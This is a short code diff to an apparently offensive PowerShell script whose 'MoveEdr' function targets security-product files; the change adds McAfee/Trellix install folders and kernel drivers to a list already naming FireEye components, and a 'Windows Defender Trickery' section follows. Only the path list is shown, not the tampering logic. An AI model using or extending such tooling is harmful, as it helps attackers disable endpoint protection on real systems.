@@ -81,7 +81,13 @@ function MoveEdr{
 			"C:\Windows\System32\drivers\FeKern.sys",
 			"C:\Windows\System32\drivers\FeElam.sys",
 			"C:\ProgramData\FireEye\xagt\exts\MalwareProtection\sandbox\fe_avk.sys",
-			"C:\Windows\FireEye"
+			"C:\Windows\FireEye",
+
+			#McAfee/Trellix
+			"C:\Program Files\McAfee",
+			"C:\Program Files\Common Files\McAfee",
+			"C:\Windows\System32\drivers\mfeaack.sys",
+			"C:\Windows\System32\drivers\mfencbdc.sys"
 			)
 		
 		# Windows Defender Trickery
